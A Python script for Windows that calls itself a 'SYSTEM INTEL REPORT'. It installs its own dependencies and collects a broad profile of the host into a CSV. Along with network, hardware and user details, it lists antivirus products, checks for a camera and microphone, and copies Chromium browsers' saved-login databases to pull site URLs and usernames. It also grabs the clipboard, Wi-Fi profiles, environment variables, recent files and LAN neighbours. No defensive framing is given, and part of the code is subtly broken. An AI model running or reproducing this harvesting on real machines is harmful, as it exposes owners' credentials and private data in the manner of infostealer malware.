import importlib
import subprocess
import sys

# List of third-party packages to ensure are installed.
# Each tuple is (module_name_to_check, package_name_to_install)
required_packages = [
    ("psutil", "psutil"),
    ("requests", "requests"),
    ("pytz", "pytz"),
    ("pywifi", "pywifi"),
    ("wmi", "WMI")
]

def install_package(package_name):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
    except subprocess.CalledProcessError as e:
        sys.exit(f"Failed to install package '{package_name}'. Error: {e}")

for module_name, package_name in required_packages:
    if importlib.util.find_spec(module_name) is None:
        print(f"Package '{module_name}' not found. Installing '{package_name}'...")
        install_package(package_name)
    else:
        print(f"Package '{module_name}' is already installed. Skipping installation.")



import socket
import uuid
import psutil
import platform
import requests
import os
import getpass
import subprocess
import re
import winreg
import shutil
import sqlite3
import csv
from datetime import datetime
from pytz import timezone, utc

# 😎 Let's get our IP info from all angles!
def get_ip_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        # Also fetch additional local IP addresses (IPv6 if available)
        local_ips = [addr.address for iface, addrs in psutil.net_if_addrs().items() for addr in addrs if addr.family in (socket.AF_INET, socket.AF_INET6)]
        ext_ipv4 = requests.get('https://api.ipify.org').text
        ext_ipv6 = requests.get('https://api64.ipify.org').text
    except Exception as e:
        local_ip = "Unknown"
        local_ips = ["Unknown"]
        ext_ipv4 = ext_ipv6 = "Unknown"
    return local_ip, local_ips, ext_ipv4, ext_ipv6

# 😏 Grab all the MAC addresses
def get_mac_addresses():
    macs = []
    for interface, snics in psutil.net_if_addrs().items():
        for snic in snics:
            if snic.family == psutil.AF_LINK:
                macs.append((interface, snic.address))
    return macs

# 😎 Improved SSID detection using case-insensitive search
def get_network_name():
    try:
        output = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True)
        ssid_match = re.search(r"^\s*SSID\s*:\s*(.+)$", output, re.MULTILINE | re.IGNORECASE)
        if ssid_match:
            ssid = ssid_match.group(1).strip()
            # Some outputs might have "SSID" with extra spaces or hidden characters
            return ssid if ssid != "" else "SSID can't be determined"
        else:
            return "SSID can't be determined"
    except Exception as e:
        return "SSID can't be determined"

def get_network_profile_type():
    try:
        output = subprocess.check_output(
            'powershell -Command "Get-NetConnectionProfile | Select-Object -ExpandProperty NetworkCategory"',
            shell=True,
            text=True
        )
        return output.strip() if output.strip() else "Unknown"
    except Exception as e:
        return "Unknown"

# 😲 Get device specs in style!
def get_device_specs():
    cpu = platform.processor()
    ram = round(psutil.virtual_memory().total / (1024**3), 2)
    system = platform.system()
    version = platform.version()
    try:
        gpu_output = subprocess.check_output(
            'powershell "Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty Name"',
            shell=True, text=True)
        gpu = gpu_output.strip()
    except Exception as e:
        gpu = "Unknown"
    drives = []
    for part in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(part.mountpoint)
            drives.append((part.device, part.mountpoint, round(usage.total / (1024**3), 2)))
        except Exception as e:
            continue
    return cpu, ram, system, version, gpu, drives

# ⚡️ Enhanced battery status: tells if charging or not
def get_battery_status():
    battery = psutil.sensors_battery()
    if battery:
        charger_status = "Connected to Charger" if battery.power_plugged else "Not Connected to Charger"
        return f"Battery Present: Yes | Level: {battery.percent}% | {charger_status}"
    else:
        return "Battery Present: No"


# 🕺 Get user info!
def get_user_info():
    username = getpass.getuser()
    device_name = platform.node()
    return username, device_name

# 💌 Get the default/signed in email of the device
def get_default_email():
    try:
        output = subprocess.check_output("whoami /upn", shell=True, text=True)
        return output.strip()
    except Exception as e:
        return "Unknown"

# 🌐 List all installed browsers
def get_installed_browsers():
    browsers = []
    browser_keys = [
        r"SOFTWARE\Clients\StartMenuInternet",
        r"SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
    ]
    for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
        for key_path in browser_keys:
            try:
                with winreg.OpenKey(root, key_path) as hkey:
                    for i in range(winreg.QueryInfoKey(hkey)[0]):
                        subkey_name = winreg.EnumKey(hkey, i)
                        browsers.append(subkey_name)
            except Exception as e:
                continue
    return list(set(browsers)) or ["None found"]

# 🛡 Get antivirus products info
def get_antivirus_products():
    try:
        output = subprocess.check_output(
            'powershell "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object -ExpandProperty displayName"',
            shell=True, text=True
        )
        avs = [line.strip() for line in output.strip().splitlines() if line.strip()]
        return avs if avs else ["None"]
    except Exception as e:
        return ["Error accessing antivirus info"]

# 🎧 Get Bluetooth devices connected
def get_bluetooth_devices():
    try:
        output = subprocess.check_output(
            'powershell "Get-PnpDevice -Class Bluetooth | Where-Object { $_.Status -eq \'OK\' } | Select-Object -ExpandProperty FriendlyName"',
            shell=True, text=True
        )
        devices = [line.strip() for line in output.strip().splitlines() if line.strip()]
        return devices if devices else ["No connected Bluetooth devices"]
    except Exception as e:
        return ["Bluetooth not available or error"]

# 🎥 Check for camera and microphone presence
def check_cam_and_mic():
    try:
        cam_output = subprocess.check_output(
            'powershell "Get-PnpDevice | Where-Object { $_.FriendlyName -like \'*camera*\' } | Select-Object -ExpandProperty FriendlyName"',
            shell=True, text=True
        )
        mic_output = subprocess.check_output(
            'powershell "Get-PnpDevice | Where-Object { $_.FriendlyName -like \'*microphone*\' } | Select-Object -ExpandProperty FriendlyName"',
            shell=True, text=True
        )
        return bool(cam_output.strip()), bool(mic_output.strip())
    except Exception as e:
        return False, False

# 🌐 Identify Chromium-based browsers from registry
def find_chromium_browsers():
    paths = []
    keys = [
        r"SOFTWARE\Clients\StartMenuInternet",
        r"SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
    ]
    for root in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
        for key in keys:
            try:
                with winreg.OpenKey(root, key) as hkey:
                    for i in range(winreg.QueryInfoKey(hkey)[0]):
                        browser_key = winreg.EnumKey(hkey, i)
                        with winreg.OpenKey(hkey, browser_key) as subkey:
                            path, _ = winreg.QueryValueEx(subkey, None)
                            paths.append(browser_key.lower())
            except Exception as e:
                continue
    return list(set([p for p in paths if any(x in p for x in ['chrome', 'edge', 'brave', 'opera', 'vivaldi'])]))

# 🔍 Get user data path for specific browser
def get_user_data_path(browser_name):
    user_paths = {
        "chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        "edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
        "brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
        "opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
        "vivaldi": os.path.expandvars(r"%LOCALAPPDATA%\Vivaldi\User Data"),
    }
    for key in user_paths:
        if key in browser_name:
            return user_paths[key]
    return None

# 🔐 Extract saved usernames/emails from browser credentials
def extract_usernames_emails(browser, user_path):
    login_data_path = os.path.join(user_path, "Default", "Login Data")
    if not os.path.exists(login_data_path):
        return []

    temp_copy = "temp_login_data.db"
    shutil.copy2(login_data_path, temp_copy)
    conn = sqlite3.connect(temp_copy)
    cursor = conn.cursor()

    creds = []
    try:
        cursor.execute("SELECT origin_url, username_value FROM logins")
        for row in cursor.fetchall():
            url, username = row
            if username and ("@" in username or len(username) > 2):
                creds.append((browser, url, username))
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    os.remove(temp_copy)
    return creds

def run_browser_cred_extract():
    creds_list = []
    browsers = find_chromium_browsers()
    for browser in browsers:
        path = get_user_data_path(browser)
        if path and os.path.exists(path):
            creds = extract_usernames_emails(browser, path)
            for b, url, user in creds:
                creds_list.append([b.upper(), url, user])
    return creds_list

# ⏰ New function to get device's local time and timezone info!
def get_device_time_info():
    local_time = datetime.now()
    # Getting the timezone info from the system, if available
    try:
        tz_name = datetime.now().astimezone().tzname()
    except Exception as e:
        tz_name = "Unknown"
    return local_time.strftime("%Y-%m-%d %H:%M:%S"), tz_name



#---------------------------------------------------------------------------------

import os
import psutil
import platform
import subprocess
import socket
import time
import locale  # ← add this line
from datetime import datetime
import pywifi
import winreg
import ctypes
import json
import wmi


def get_installed_software():
    data = []
    reg_paths = [
        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
    ]
    for reg_path in reg_paths:
        try:
            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
            try:
                count = winreg.QueryInfoKey(reg_key)[0]
            except Exception:
                count = 0
            for i in range(count):
                try:
                    sub_key_name = winreg.EnumKey(reg_key, i)
                    sub_key = winreg.OpenKey(reg_key, sub_key_name)
                    try:
                        name = winreg.QueryValueEx(sub_key, 'DisplayName')[0]
                        data.append(name)
                    except Exception:
                        continue
                except Exception:
                    continue
        except Exception:
            continue
    return data

def clipboard_history():  # Basic current clipboard only
    try:
        import pyperclip
        return pyperclip.paste()
    except Exception:
        return ""

def get_browser_history(days=2):
    # Limited: Browsers store in SQLite or elsewhere; requires parsing their files
    try:
        return "Use browser-specific tools (e.g., `sqlite3` for Chrome history)."
    except Exception:
        return ""

def get_wifi_info():
    try:
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        time.sleep(2)
        results = iface.scan_results()
        wifi_list = []
        for network in results:
            try:
                wifi_list.append((network.ssid, network.signal))
            except Exception:
                continue
        return wifi_list
    except Exception:
        return []

def get_device_language():
    try:
        return locale.getdefaultlocale()
    except Exception:
        return ("Unknown", "Unknown")

def get_profile_pic():
    try:
        userprofile = os.getenv("USERPROFILE")
        if not userprofile:
            return ""
        return os.path.join(userprofile, 'AppData\\Roaming\\Microsoft\\Windows\\AccountPictures')
    except Exception:
        return ""

def get_keyboard_layout():
    try:
        return ctypes.windll.user32.GetKeyboardLayout(0)
    except Exception:
        return None

def get_linked_email():
    try:
        return os.getenv('USERNAME', '')
    except Exception:
        return ""

def get_top_processes():
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'memory_info', 'cpu_percent']):
            try:
                proc.cpu_percent(interval=0.1)
                processes.append(proc.info)
            except Exception:
                continue
        top_cpu = sorted(processes, key=lambda p: p.get('cpu_percent', 0), reverse=True)[:6]
        top_mem = sorted(processes, key=lambda p: (p.get('memory_info').rss if p.get('memory_info') else 0), reverse=True)[:6]
        return {
            'Top CPU': top_cpu,
            'Top RAM': top_mem
        }
    except Exception:
        return {'Top CPU': [], 'Top RAM': []}

def check_vpn_proxy():
    try:
        output = subprocess.getoutput('ipconfig /all')
        return {
            'VPN or proxy': "VPN" if "TAP" in output or "TUN" in output else "None detected",
            'Proxy enabled': 'Yes' if "Proxy" in output else 'No'
        }
    except Exception:
        return {'VPN or proxy': "Unknown", 'Proxy enabled': "Unknown"}

def get_wifi_profiles():
    try:
        result = subprocess.check_output("netsh wlan show profiles").decode()
        return result
    except Exception:
        return ""

def get_recent_files():
    try:
        recent_path = os.path.join(os.environ['USERPROFILE'], 'Recent')
        files = []
        for f in os.listdir(recent_path):
            try:
                full_path = os.path.join(recent_path, f)
                files.append((f, time.ctime(os.path.getctime(full_path))))
            except Exception:
                continue
        return files
    except Exception:
        return []

def get_uptime():
    try:
        return time.time() - psutil.boot_time()
    except Exception:
        return 0

def get_battery_report():
    try:
        username = getpass.getuser()
        ct_time = datetime.now(timezone('US/Central')).strftime('%Y%m%d_%H%M%S')
        filename = f"{username}_{ct_time}_battery report.html"
        path = os.path.join(os.getcwd(), filename)
        subprocess.call(["powercfg", "/batteryreport", "/output", path])
        return path
    except Exception:
        return ""

def get_env_vars():
    try:
        return dict(os.environ)
    except Exception:
        return {}

def lan_devices():
    try:
        output = subprocess.getoutput("arp -a")
        return output
    except Exception:
        return ""

def monitor_resolution():
    try:
        from screeninfo import get_monitors
        return [str(m) for m in get_monitors()]
    except Exception:
        return []

def dns_open_ports():
    try:
        import socket
        return socket.getaddrinfo(socket.gethostname(), None)
    except Exception:
        return []

def get_serials_and_specs():
    try:
        c = wmi.WMI()
        cpu = c.Win32_Processor()[0].ProcessorId.strip() if c.Win32_Processor() else "Unknown"
        gpu = c.Win32_VideoController()[0].Name if c.Win32_VideoController() else "Unknown"
        ram = round(psutil.virtual_memory().total / (1024**3), 2)
        return {
            'CPU Serial': cpu,
            'GPU': gpu,
            'RAM (GB)': ram
        }
    except Exception:
        return {'CPU Serial': "Unknown", 'GPU': "Unknown", 'RAM (GB)': 0}

def storage_devices():
    try:
        drives = psutil.disk_partitions()
        data = []
        for d in drives:
            try:
                data.append((d.device, d.fstype, d.opts))
            except Exception:
                continue
        return data
    except Exception:
        return []

def last_os_update():
    try:
        updates = subprocess.getoutput("wmic qfe get HotFixID,InstalledOn")
        return updates
    except Exception:
        return ""

# ============================ RUN REPORT ============================
def run_device_report():
    print("\nSYSTEM INTEL REPORT 🚀\n")

    # IPs
    local, local_ips, ext4, ext6 = get_ip_info()
    print(f"IPs:\n  Primary Internal: {local}\n  All Local IPs: {', '.join(local_ips)}\n  External v4: {ext4}\n  External v6: {ext6}")

    # MAC
    mac_addresses = get_mac_addresses()
    print("\nMAC Addresses:")
    for iface, mac in mac_addresses:
        print(f"  {iface}: {mac}")

    # Network Info
    network_name = get_network_name()
    network_profile_type = get_network_profile_type()
    print(f"\nNetwork:\n  SSID: {network_name}\n  Profile Type: {network_profile_type}")

    # Specs
    cpu, ram, osys, ver, gpu, drives = get_device_specs()
    print(f"\nSpecs:\n  OS: {osys} {ver}\n  CPU: {cpu}\n  RAM: {ram} GB\n  GPU: {gpu}")
    for d in drives:
        print(f"  Drive: {d[0]} ({d[1]}) => {d[2]} GB")

    # Battery
    battery_status = get_battery_status()
    print(f"\nBattery: {battery_status}")

    # Time Info
    device_time, device_tz = get_device_time_info()
    central_time = datetime.now(timezone('US/Central')).strftime("%Y-%m-%d %H:%M:%S")
    print(f"\nTime Info:\n  Device Local Time: {device_time} (Time Zone: {device_tz})\n  Central Time (CT): {central_time}")

    # User Info
    username, device = get_user_info()
    default_email = get_default_email()
    print(f"\nUser Info:\n  Username: {username}\n  Device Name: {device}\n  Signed-in Email: {default_email}")

    # Browsers
    installed_browsers = get_installed_browsers()
    print(f"\nBrowsers Installed: {', '.join(installed_browsers)}")

    # Antivirus
    antivirus_products = get_antivirus_products()
    print("\nAntiviruses:")
    for av in antivirus_products:
        print(f"  - {av}")

    # Bluetooth
    bluetooth_devices = get_bluetooth_devices()
    print("\nBluetooth Devices:")
    for dev in bluetooth_devices:
        print(f"  - {dev}")

    # Cam & Mic
    cam, mic = check_cam_and_mic()
    print(f"\nCamera: {'Available' if cam else 'Not found'}")
    print(f"Microphone: {'Available' if mic else 'Not found'}")

    # Browser Credentials
    browser_creds = run_browser_cred_extract()


    # Save to CSV
    central = timezone('US/Central')
    now = datetime.now(central)
    timestamp = now.strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{username}_{timestamp}_{osys}_{ver}.csv"

    with open(filename, mode='w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["Category", "Detail", "Value"])

        writer.writerow(["IP", "Primary Internal", local])
        writer.writerow(["IP", "All Local IPs", ', '.join(local_ips)])
        writer.writerow(["IP", "External v4", ext4])
        writer.writerow(["IP", "External v6", ext6])

        for iface, mac in mac_addresses:
            writer.writerow(["MAC Address", iface, mac])

        writer.writerow(["Network", "SSID", network_name])
        writer.writerow(["Network", "Profile Type", network_profile_type])

        writer.writerow(["Specs", "OS", f"{osys} {ver}"])
        writer.writerow(["Specs", "CPU", cpu])
        writer.writerow(["Specs", "RAM", f"{ram} GB"])
        writer.writerow(["Specs", "GPU", gpu])
        for d in drives:
            writer.writerow(["Specs", "Drive", f"{d[0]} ({d[1]}) => {d[2]} GB"])

        writer.writerow(["Battery", "Status", battery_status])

        writer.writerow(["Time Info", "Device Local Time", device_time])
        writer.writerow(["Time Info", "Device Time Zone", device_tz])
        writer.writerow(["Time Info", "Central Time (CT)", central_time])

        writer.writerow(["User Info", "Username", username])
        writer.writerow(["User Info", "Device Name", device])
        writer.writerow(["User Info", "Signed-in Email", default_email])

        writer.writerow(["Browsers", "Installed", ', '.join(installed_browsers)])

        for av in antivirus_products:
            writer.writerow(["Antivirus", "Product", av])

        for dev in bluetooth_devices:
            writer.writerow(["Bluetooth", "Device", dev])

        writer.writerow(["Camera", "Status", 'Available' if cam else 'Not found'])
        writer.writerow(["Microphone", "Status", 'Available' if mic else 'Not found'])

        for b, url, user in browser_creds:
            writer.writerow(["Browser Credential", b, f"{url} ➜ {user}"])

        writer.writerow(["Additional System Info", "Installed software", ', '.join(get_installed_software()[:10])])
        writer.writerow(["Additional System Info", "Clipboard", str(clipboard_history())])
        writer.writerow(["Additional System Info", "Device language", get_device_language()])
        writer.writerow(["Additional System Info", "Keyboard layout", get_keyboard_layout()])
        writer.writerow(["Additional System Info", "Linked user/email", get_linked_email()])
        writer.writerow(["Additional System Info", "Wi-Fi Info (SSID, Signal)", str(get_wifi_info())])
        writer.writerow(["Additional System Info", "Wi-Fi Profiles", str(get_wifi_profiles())])
        writer.writerow(["Additional System Info", "Recent Files", ', '.join(get_recent_files()[:5])])
        writer.writerow(["Additional System Info", "System Uptime (s)", str(get_uptime())])
        writer.writerow(["Additional System Info", "Battery Report saved at", get_battery_report()])
        writer.writerow(["Additional System Info", "Environment Variables", str(get_env_vars())])
        writer.writerow(["Additional System Info", "LAN devices", str(lan_devices())])
        writer.writerow(["Additional System Info", "Monitor resolutions", str(monitor_resolution())])
        writer.writerow(["Additional System Info", "Open DNS Ports", str(dns_open_ports())])
        writer.writerow(["Additional System Info", "Specs", str(get_serials_and_specs())])
        writer.writerow(["Additional System Info", "Storage devices", str(storage_devices())])
        writer.writerow(["Additional System Info", "Top Processes", json.dumps(get_top_processes(), indent=2)])
        writer.writerow(["Additional System Info", "VPN/Proxy Info", str(check_vpn_proxy())])
        writer.writerow(["Additional System Info", "Last OS Update", str(last_os_update())])

    print(f"\nReport saved as {filename} 🚀")

# Launch it
run_device_report()
